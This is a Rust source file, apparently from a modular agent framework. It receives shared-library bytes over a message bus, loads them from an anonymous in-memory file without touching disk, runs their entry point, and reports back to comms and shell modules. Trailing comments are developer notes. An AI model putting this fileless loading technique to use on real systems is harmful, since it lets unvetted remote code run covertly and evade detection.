use crate::bus::BusController;
use libc::{dlopen, dlsym};
use sozo_api::plugin::{ModuleVTable, PluginModule};
use sozo_api::{BusMessage, Module, ModuleIdentity, sozo_debug};
use std::ffi::{CString, c_void};
use tokio::sync::Mutex;
use tokio::sync::mpsc::{Receiver, Sender};
use tokio_util::sync::CancellationToken;

struct FileDescriptor {
    fd: i32,
}

impl FileDescriptor {
    pub fn as_raw(&self) -> i32 {
        self.fd
    }
}

impl TryFrom<i32> for FileDescriptor {
    type Error = ();
    fn try_from(fd: i32) -> Result<Self, Self::Error> {
        if fd < 0 {
            return Err(());
        } else {
            Ok(FileDescriptor { fd })
        }
    }
}

impl Drop for FileDescriptor {
    fn drop(&mut self) {
        if self.fd >= 0 {
            unsafe {
                libc::close(self.fd);
            }
        }
    }
}

#[derive(Debug)]
enum LoadError {
    Success,
    Critical,
    Waiting,
    InvalidLength,
    UnableToMemCreate,
    UnableToWrite,
    UnableToDlOpen,
    ExportNotFound,
    UnableToCreateInstance,
}

enum LoadState {
    Idle,
    Loading { so_size: usize, so_data: Vec<u8> },
}

pub struct LibraryLoader {
    identity: ModuleIdentity,
    tx: Sender<BusMessage>,
    rx: Mutex<Receiver<BusMessage>>,
    bus_ctrl: BusController,
}

impl LibraryLoader {
    pub fn new(bus_ctrl: BusController) -> LibraryLoader {
        const MAX_MSG_BUFFER: usize = 1024;
        let (tx, rx) = tokio::sync::mpsc::channel::<BusMessage>(MAX_MSG_BUFFER);

        LibraryLoader {
            identity: ModuleIdentity::LOADER,
            tx,
            rx: Mutex::new(rx),
            bus_ctrl,
        }
    }

    fn handle_inbound_msg(&self, state: &mut LoadState, msg: &[u8]) -> Result<Vec<u8>, LoadError> {
        #[cfg(debug_assertions)]
        const MAX_SO_SIZE: usize = 1024 * 1024 * 1024 * 10;

        #[cfg(not(debug_assertions))]
        const MAX_SO_SIZE: usize = 1024 * 1024;

        match state {
            LoadState::Idle => {
                if msg.len() != size_of::<u32>() {
                    return Err(LoadError::InvalidLength);
                }

                let so_size = u32::from_be_bytes(msg.try_into().unwrap()) as usize;
                if so_size > MAX_SO_SIZE {
                    return Err(LoadError::InvalidLength);
                }

                let mut so_data: Vec<u8> = Vec::new();
                if so_data.try_reserve(so_size).is_err() {
                    return Err(LoadError::Critical);
                }

                *state = LoadState::Loading { so_size, so_data };

                Err(LoadError::Waiting)
            }
            LoadState::Loading { so_size, so_data } => {
                let remaining_size = *so_size - so_data.len();
                if msg.len() > remaining_size {
                    return Err(LoadError::InvalidLength);
                }

                so_data.extend_from_slice(msg);

                if so_data.len() == *so_size {
                    let so = std::mem::take(so_data);
                    *state = LoadState::Idle;
                    return Ok(so);
                }

                Err(LoadError::Waiting)
            }
        }
    }

    fn load_shared_object(&self, lib_so: &[u8]) -> Result<*mut c_void, LoadError> {
        let fd = unsafe { libc::memfd_create(c"plugin".as_ptr(), libc::MFD_CLOEXEC) };

        if fd < 0 {
            return Err(LoadError::UnableToMemCreate);
        }

        let Ok(fd) = FileDescriptor::try_from(fd) else {
            return Err(LoadError::Critical);
        };

        let result =
            unsafe { libc::write(fd.as_raw(), lib_so.as_ptr() as *const c_void, lib_so.len()) };

        if -1 == result || lib_so.len() as isize != result {
            return Err(LoadError::UnableToWrite);
        }

        let file_path = match CString::new(format!("/proc/self/fd/{}", fd.as_raw())) {
            Ok(path) => path,
            Err(_) => {
                return Err(LoadError::Critical);
            }
        };

        let address = unsafe { dlopen(file_path.as_ptr(), libc::RTLD_NOW | libc::RTLD_LOCAL) };

        if address.is_null() {
            return Err(LoadError::UnableToDlOpen);
        }

        Ok(address)
    }

    fn create_plugin(&self, so_addr: *mut c_void) -> Result<PluginModule, LoadError> {
        if so_addr.is_null() {
            return Err(LoadError::Critical);
        }

        let export_name = match CString::new("module_entry") {
            Ok(name) => name,
            Err(_) => return Err(LoadError::Critical),
        };

        let export_addr = unsafe { dlsym(so_addr, export_name.as_ptr()) };

        if export_addr.is_null() {
            return Err(LoadError::ExportNotFound);
        }

        let module_entry: extern "C" fn() -> *const ModuleVTable =
            unsafe { std::mem::transmute(export_addr) };

        let module_vtable = module_entry();
        if module_vtable.is_null() {
            return Err(LoadError::Critical);
        }

        let instance = unsafe { ((*module_vtable).init)() };
        if instance.is_null() {
            return Err(LoadError::UnableToCreateInstance);
        }

        Ok(PluginModule::new(so_addr, module_vtable, instance))
    }

    fn send_response(
        &self,
        bus_channel: &Sender<BusMessage>,
        identity: Option<ModuleIdentity>,
        retcode: LoadError,
    ) -> bool {
        /*
         * Retcode
         * Option<Identity> -- None == 0
         */
        const LOADER_RESPONSE_LEN: usize = 4;

        let identity = match identity {
            Some(identity) => identity.0,
            None => 0u32,
        }
        .to_be_bytes();

        let mut packet: Vec<u8> = Vec::new();
        if packet.try_reserve(LOADER_RESPONSE_LEN).is_err() {
            return false;
        }

        packet.extend_from_slice(&(retcode as u8).to_be_bytes());
        packet.extend_from_slice(&identity);

        if bus_channel
            .try_send(BusMessage {
                identity: ModuleIdentity::COMMS,
                remote: Some(ModuleIdentity::SHELL),
                msg: packet,
            })
            .is_err()
        {
            return false;
        }

        true
    }
}

#[async_trait::async_trait]
impl Module for LibraryLoader {
    fn get_identity(&self) -> ModuleIdentity {
        self.identity
    }

    async fn run(&self, bus_channel: Sender<BusMessage>, token: CancellationToken) {
        sozo_debug!("LibraryLoader::run", "starting");

        let mut rx = self.rx.lock().await;
        let mut state = LoadState::Idle;

        loop {
            tokio::select! {
                _ = token.cancelled() => {
                    sozo_debug!("LibraryLoader::run", "cancelled");
                    break;
                }
                msg = rx.recv() => {
                    if let Some(msg) = msg {
                        if msg.msg.is_empty() {
                            sozo_debug!("LibraryLoader::run", "msg is empty");
                            break;
                        }

                        let lib_so = match self.handle_inbound_msg(&mut state, &msg.msg) {
                            Ok(lib_so) => lib_so,
                            Err(LoadError::Waiting) => {
                                continue;
                            },
                            Err(_) => {
                                sozo_debug!("LibraryLoader::run", "critical error or violation to network protocol");
                                break;
                            },
                        };

                        let so_addr = match self.load_shared_object(&lib_so) {
                            Ok(addr) => addr,
                            Err(LoadError::Critical) => break,
                            Err(err) => {
                                sozo_debug!("LibraryLoader::run", "load_shared_object returned err -- {:?}", err);
                                if !self.send_response(&bus_channel, None, err) {
                                    break;
                                }

                                continue;
                            }
                        };

                        let plugin = match self.create_plugin(so_addr) {
                            Ok(plugin) => plugin,
                            Err(LoadError::Critical) => break,
                            Err(err) => {
                                sozo_debug!("LibraryLoader::run", "create_plugin returned err {:?}", err);
                                if !self.send_response(&bus_channel, None, err) {
                                    break;
                                }

                                continue;
                            }
                        };

                        let identity = plugin.get_identity();

                        if !self.bus_ctrl.register(Box::new(plugin)).await {
                            sozo_debug!("LibraryLoader::run", "error occured while performing registration and execution of requested plugin");
                            break;
                        }

                        sozo_debug!("LibraryLoader::run", "plugin: {:?} -- successfully registered and executed within module bus", identity);
                        if !self.send_response(&bus_channel, Some(identity), LoadError::Success) {
                            break;
                        }
                    } else {
                        break;
                    }
                }
            }
        }
        token.cancel();
    }

    fn enqueue(&self, msg: BusMessage) -> bool {
        self.tx.try_send(msg).is_ok()
    }
}

// get rid of 'file ops on first use]
// just at teh top of the command output, make it known that if commands reuire modules to be loaded, this will occur transparently, no need to add in each
